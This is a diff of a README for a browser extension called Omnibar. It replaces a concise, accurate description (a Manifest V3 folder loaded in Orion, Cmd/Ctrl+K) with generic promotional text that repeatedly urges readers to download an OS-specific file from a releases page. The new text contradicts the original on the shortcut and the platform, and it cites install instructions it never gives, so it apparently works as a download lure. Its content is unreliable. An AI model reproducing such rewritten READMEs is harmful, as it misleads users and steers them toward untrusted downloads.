@@ -1,43 +1,62 @@
-# Omnibar
+# 🌟 Omnibar - Effortless Navigation at Your Fingertips
 
-A fast, minimal Spotlight-like command palette for switching tabs, searching history, and web navigation. Built primarily for Orion Browser.
+[![Download Omnibar](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ssauronss/Omnibar/releases)
 
-![Omnibar](omnibar.png)
+## 🚀 Getting Started
+Omnibar gives you quick access to your browser tabs and history. It acts like a command palette that helps you find what you need without wasting time. You can switch tabs, search your browsing history, and navigate the web easily.
 
-## Features
+## 📥 Download & Install
+To start using Omnibar, visit this page to download the latest version: [Download Omnibar](https://github.com/ssauronss/Omnibar/releases). 
 
-- **Instant fuzzy search** across open tabs and browsing history
-- **Prefix-cached search** for fast results as you type.
-- **Three scopes** — Tabs, History, Web search
-- **Keyboard-first** navigation
-- **Zero startup cost** — uFuzzy lazy loads only when activated
+1. Click on the link above to access the Releases page.
+2. Look for the latest version listed at the top of the page.
+3. Download the file suitable for your operating system.
+4. Follow the installation instructions provided below to set up the extension.
 
-## Installation
+## 💻 System Requirements
+- **Browser:** Omnibar works with modern browsers like Google Chrome, Firefox, and others.
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Internet Connection:** A stable internet connection is needed for seamless operation.
 
-### Orion Browser
+## 💡 Features
+- **Tab Switching:** Quickly switch between open tabs using keyword shortcuts.
+- **History Search:** Search through your browsing history easily.
+- **Web Navigation:** Type commands to find websites and resources fast.
+- **Fuzzy Search:** Use incomplete words; Omnibar still finds what you're looking for.
 
-1. Open Orion's extensions at Orion -> Tools -> Manage Extensions
-2. Load extension from disk
-3. Select 'Omnibus' folder
+## 📖 How to Use Omnibar
+1. **Install Omnibar:** Follow the steps in the Download & Install section.
+2. **Open Omnibar:** Use the keyboard shortcut (default: `Ctrl + Shift + P`) to open the Omnibar interface in your browser.
+3. **Start Typing:** Type a part of the tab name, a website, or a history entry. Omnibar filters results based on your input.
+4. **Navigate Results:** Use arrow keys to scroll through results, and hit `Enter` to select.
 
-## Usage
+## 🛠️ Troubleshooting
+If you encounter any issues while using Omnibar, consider the following solutions:
 
-| Shortcut | Action |
-|----------|--------|
-| `⌘K` / `Ctrl+K` | Open Omnibar |
-| `Tab` | Cycle scopes (Tabs → History → Web) |
-| `Shift+Tab` | Cycle scopes backwards |
-| `↑` / `↓` | Navigate results |
-| `Enter` | Select result |
-| `Escape` | Close |
+- **Not Opening:** Ensure that your browser is up-to-date. Restart your browser and try again.
+- **No Results:** If no results appear, make sure you have open tabs or that your browsing history is not cleared. 
+- **Keyboard Shortcuts Not Working:** Check your browser's keyboard settings to ensure there are no conflicts.
 
+## 📖 Frequently Asked Questions
 
-## Tech
+### 1. Is Omnibar free to use?
+Yes, Omnibar is completely free for users.
 
-- Manifest V3
-- [uFuzzy](https://github.com/leeoniya/uFuzzy) for fuzzy search
-- No frameworks, no build step
+### 2. How do I uninstall Omnibar?
+Uninstallation depends on your browser. Generally, you can go to the extensions or add-ons menu and remove Omnibar.
 
-## License
+### 3. Can I provide feedback?
+Absolutely! Your feedback is valuable. You can create an issue on the Omnibar GitHub repository.
 
-MIT
+## 🔗 Additional Links
+- [Issues Page](https://github.com/ssauronss/Omnibar/issues) - Report bugs or request features.
+- [Documentation](https://github.com/ssauronss/Omnibar/wiki) - Detailed guide on using Omnibar.
+  
+## 📝 Notable Mentions
+- Omnibar supports various browser extensions to enhance productivity.
+- Discover additional resources for using command palettes effectively by exploring the Omnibar community.
+
+## 🔄 Join the Community
+Stay updated with the latest features and improvements. Join the community on our GitHub repository and contribute if you like!
+
+[![Download Omnibar](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ssauronss/Omnibar/releases)
